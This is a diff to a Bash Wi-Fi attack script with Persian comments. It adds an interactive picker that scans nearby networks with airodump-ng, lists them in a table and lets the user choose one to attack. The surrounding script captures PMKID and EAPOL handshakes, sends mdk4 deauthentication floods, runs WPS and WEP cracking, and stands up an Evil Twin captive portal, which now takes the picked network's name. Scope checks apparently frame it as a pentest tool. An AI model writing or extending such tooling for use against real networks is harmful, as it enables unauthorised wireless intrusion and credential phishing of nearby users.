@@ -5,7 +5,7 @@
 #           [-d dictdir] [--no-wps] [--no-twin] [--no-post] [--no-harvest]
 #           [--harvest-time N] [--target BSSID] [--auto] [--resume]
 #           [--pmkid-only] [--from-pcap FILE] [--scope FILE] [--authorize] [--allow-all]
-#           [--compute-wps-pins BSSID] [--parse-pcap FILE] [--wep] [--no-config-extract] [--no-default-psk] [--wps-state FILE] [--session NAME] [--restore] [--doctor] [--no-color] [--dry-run|--simulate]
+#           [--compute-wps-pins BSSID] [--parse-pcap FILE] [--wep] [--no-config-extract] [--no-default-psk] [--wps-state FILE] [--session NAME] [--restore] [--doctor] [--no-color] [--interactive] [--dry-run|--simulate]
 #  پروفایل: stealth | normal | brute
 # ==========================================================================
 set -uo pipefail
@@ -49,6 +49,9 @@ EAPOL_N=0
 EAP_N=0
 WORK=""
 NO_COLOR_FLAG=0
+INTERACTIVE=0
+TARGET_ESSID=""
+TARGET_ROWS=""
 
 # ---------- UI: palette + helpers (wifite2-style) ----------
 if [[ -t 1 ]] && [ -z "${NO_COLOR:-}" ] && [ "${TERM:-dumb}" != dumb ]; then
@@ -612,6 +615,7 @@ while [ $# -gt 0 ]; do
     --dry-run|--simulate) DRY_RUN=1; shift;;
     --doctor) DOCTOR=1; shift;;
     --no-color) NO_COLOR_FLAG=1; shift;;
+    --interactive) INTERACTIVE=1; shift;;
     --auto) AUTO=1; shift;;
     --resume) RESUME=1; shift;;
     --pmkid-only) PMKID_ONLY=1; shift;;
@@ -744,6 +748,7 @@ print_plan() {
   [ "$WEP" -eq 1 ] && printf '│ %s\n' "Mode: WEP cracking (ARP replay / chopchop / fragmentation)"
   [ "$OFFLINE" -eq 1 ] && printf '│ %s\n' "Mode: offline / crack-only (from-pcap: $FROM_PCAP)"
   [ "$RESUME" -eq 1 ] && printf '│ %s\n' "Mode: resume (skip to phase $SKIP_TO)"
+  [ "$INTERACTIVE" -eq 1 ] && printf '│ %s\n' "Mode: interactive target picker"
   [ -n "$TARGET" ] && printf '│ %s\n' "Target: $TARGET"
   if [ -n "$SCOPE_FILE" ]; then printf '│ %s\n' "Scope: $SCOPE_FILE"; else printf '│ %s\n' "Scope: (none — all networks in range)"; fi
   if [ "$ALLOW_ALL" -eq 1 ]; then printf '│ %s\n' "Allow-all: yes (no scope file)"; fi
@@ -1007,12 +1012,90 @@ if [ "$SKIP_TO" -le 1 ] && [ "$OFFLINE" -ne 1 ] && command -v kismet >/dev/null;
   save_checkpoint 1
 fi
 
+# جمع‌آوری اهداف از CSV ایرودامپ (مبنای جدول و منوی انتخاب)
+collect_targets(){
+  local csv="${1:-$WORK/scan-01.csv}"
+  TARGET_ROWS=""
+  [ -s "$csv" ] || return 0
+  TARGET_ROWS=$(awk -F',' '
+    NR > 1 && $1 ~ /^[[:space:]]*[0-9A-Fa-f:]{17}[[:space:]]*$/ {
+      b=$1; gsub(/[[:space:]]/, "", b)
+      ch=$4; gsub(/[[:space:]]/, "", ch)
+      p=$9; gsub(/[[:space:]]/, "", p)
+      enc=$6; gsub(/^[[:space:]]+|[[:space:]]+$/, "", enc)
+      e=$14; gsub(/^[[:space:]]+|[[:space:]]+$/, "", e)
+      if (e == "") e = "(hidden)"
+      printf "%s|%s|%s|%s|%s\n", b, ch, p, enc, e
+    }' "$csv" | sort -u | head -20)
+}
+
+# جدول اهداف (ویژگی بصری اصلی، مثل wifite2)
+show_targets(){
+  [ -n "${TARGET_ROWS:-}" ] || return 0
+  local i=0 b ch p enc e
+  printf '\n  %s%-3s %-17s %-3s %-5s %-13s %s%s\n' "$_bold" "#" "BSSID" "CH" "PWR" "ENC" "ESSID" "$_rst"
+  while IFS='|' read -r b ch p enc e; do
+    i=$((i + 1))
+    printf '  %s%2d%s  %-17s %-3s %-5s %-13s %s%s%s\n' \
+      "$_c" "$i" "$_rst" "$b" "$ch" "$p" "${enc:0:13}" "$_ok" "$e" "$_rst"
+  done < <(printf '%s\n' "$TARGET_ROWS")
+  printf '  %s%d network(s) discovered%s\n' "$_dim" "$i" "$_rst"
+}
+
+# انتخاب تعاملی هدف با شماره (--interactive)
+select_target(){
+  [ "$INTERACTIVE" -eq 1 ] || return 0
+  [ -n "${TARGET:-}" ] && return 0
+  [ -n "${TARGET_ROWS:-}" ] || { warn "هدف قابل انتخابی پیدا نشد."; return 0; }
+  local total choice line b ch p enc e
+  total=$(printf '%s\n' "$TARGET_ROWS" | wc -l)
+  printf '\n%s?%s شمارهٔ هدف را انتخاب کن [1-%d] (Enter = همه، q = انصراف): ' "$_ok" "$_rst" "$total"
+  if ! IFS= read -r choice; then
+    warn "ورودی تمام شد؛ ادامه با همهٔ اهداف."
+    return 0
+  fi
+  case "$choice" in
+    ''|0) ok "همهٔ شبکه‌ها انتخاب شد."; return 0 ;;
+    q|Q) warn "انتخاب هدف رد شد؛ ادامه با همه."; return 0 ;;
+  esac
+  if ! [[ "$choice" =~ ^[0-9]+$ ]]; then
+    warn "شمارهٔ نامعتبر: $choice — ادامه با همه."
+    return 0
+  fi
+  line=$(printf '%s\n' "$TARGET_ROWS" | sed -n "${choice}p")
+  if [ -z "$line" ]; then
+    warn "شماره خارج از بازه — ادامه با همه."
+    return 0
+  fi
+  IFS='|' read -r b ch p enc e <<< "$line"
+  if ! in_scope "$b" "$e"; then
+    err "هدف انتخاب‌شده خارج از scope است — رد شد."
+    return 1
+  fi
+  TARGET="$b"; TARGET_ESSID="$e"
+  ok "هدف انتخاب شد: $e ($b) — کانال $ch، $enc"
+}
+
 # ---------- فاز ۱: برداشت ----------
 if [ "$SKIP_TO" -le 2 ] && [ "$OFFLINE" -ne 1 ] && command -v hcxdumptool >/dev/null 2>&1 && command -v airodump-ng >/dev/null 2>&1; then
   if [ -n "${TARGET:-}" ] && ! in_scope "$TARGET" ""; then
     err "هدف $TARGET خارج از scope است. خروج."; exit 1
   fi
 phase "فاز ۱ — برداشت PMKID + EAPOL + EAP برای ${CAPTURE} ثانیه"
+
+# انتخاب تعاملی هدف: اسکن کوتاه، جدول، سپس برداشت فیلترشده
+if [ "$INTERACTIVE" -eq 1 ] && [ -z "$TARGET" ] && command -v airodump-ng >/dev/null 2>&1; then
+  c "اسکن اولیه ۱۵ ثانیه برای انتخاب هدف…"
+  timeout 15 airodump-ng --band abg --output-format csv -w "$WORK/prescan" "$MON" >/dev/null 2>&1 || true
+  collect_targets "$WORK/prescan-01.csv"
+  if [ -n "${TARGET_ROWS:-}" ]; then
+    show_targets
+    select_target || exit 1
+  else
+    warn "در اسکن اولیه شبکه‌ای دیده نشد؛ برداشت از همه."
+  fi
+fi
+
 capture_once || exit 1
 
 # دِاوث دوره‌ای با mdk4 برای اجبار به reassociation (در PMKID-only غیرفعال)
@@ -1052,31 +1135,6 @@ else
   fi
 fi
 
-# جدول اهداف (ویژگی بصری اصلی، مثل wifite2)
-show_targets(){
-  [ -s "$WORK/scan-01.csv" ] || return 0
-  local rows
-  rows=$(awk -F',' '
-    NR > 1 && $1 ~ /^[[:space:]]*[0-9A-Fa-f:]{17}[[:space:]]*$/ {
-      b=$1; gsub(/[[:space:]]/, "", b)
-      ch=$4; gsub(/[[:space:]]/, "", ch)
-      p=$9; gsub(/[[:space:]]/, "", p)
-      enc=$6; gsub(/^[[:space:]]+|[[:space:]]+$/, "", enc)
-      e=$14; gsub(/^[[:space:]]+|[[:space:]]+$/, "", e)
-      if (e == "") e = "(hidden)"
-      printf "%s|%s|%s|%s|%s\n", b, ch, p, enc, e
-    }' "$WORK/scan-01.csv" | sort -u | head -20)
-  [ -n "$rows" ] || return 0
-  local i=0 b ch p enc e
-  printf '\n  %s%-3s %-17s %-3s %-5s %-13s %s%s\n' "$_bold" "#" "BSSID" "CH" "PWR" "ENC" "ESSID" "$_rst"
-  while IFS='|' read -r b ch p enc e; do
-    i=$((i + 1))
-    printf '  %s%2d%s  %-17s %-3s %-5s %-13s %s%s%s\n' \
-      "$_c" "$i" "$_rst" "$b" "$ch" "$p" "${enc:0:13}" "$_ok" "$e" "$_rst"
-  done < <(printf '%s\n' "$rows")
-  printf '  %s%d network(s) discovered%s\n' "$_dim" "$i" "$_rst"
-}
-
 # ---------- فاز ۲: نرمال‌سازی ----------
 if [ "$SKIP_TO" -le 3 ] && command -v hcxpcapngtool >/dev/null 2>&1; then
 phase "فاز ۲ — استخراج و حذف تکراری"
@@ -1091,6 +1149,7 @@ elif [ "$PMKID_ONLY" -eq 1 ]; then
   warn "PMKID یافت نشد؛ ادامه با مسیر کامل (WPS/Evil-Twin فعال)."
 fi
 
+  collect_targets
   show_targets
   save_checkpoint 3
 else
@@ -1354,7 +1413,8 @@ if [ "$SKIP_TO" -le 6 ] && [ "$DO_TWIN" -eq 1 ] && [ -n "$IFACE2" ] && ! [ -s "$
   phase "فاز ۵ — Evil Twin + captive portal"
   if command -v hostapd-mana >/dev/null; then
     TGT="${TARGET:-$(awk -F',' 'NR>1 && $1 ~ /^[0-9A-Fa-f:]{17}$/ {x=$1;gsub(/ /,"",x);print x; exit}' "$WORK/scan-01.csv")}"
-    ESS=$(awk -F',' -v b="$TGT" 'NR>1 {x=$1;gsub(/ /,"",x); if(x==b){e=$14;gsub(/^ +| +$/,"",e);print e;exit}}' "$WORK/scan-01.csv")
+    ESS="$TARGET_ESSID"
+    [ -n "$ESS" ] || ESS=$(awk -F',' -v b="$TGT" 'NR>1 {x=$1;gsub(/ /,"",x); if(x==b){e=$14;gsub(/^ +| +$/,"",e);print e;exit}}' "$WORK/scan-01.csv")
     if [ -n "$TGT" ] && [ -n "$ESS" ]; then
       if ! in_scope "$TGT" "$ESS"; then
         warn "هدف twin ($TGT/$ESS) خارج از scope — رد شد."
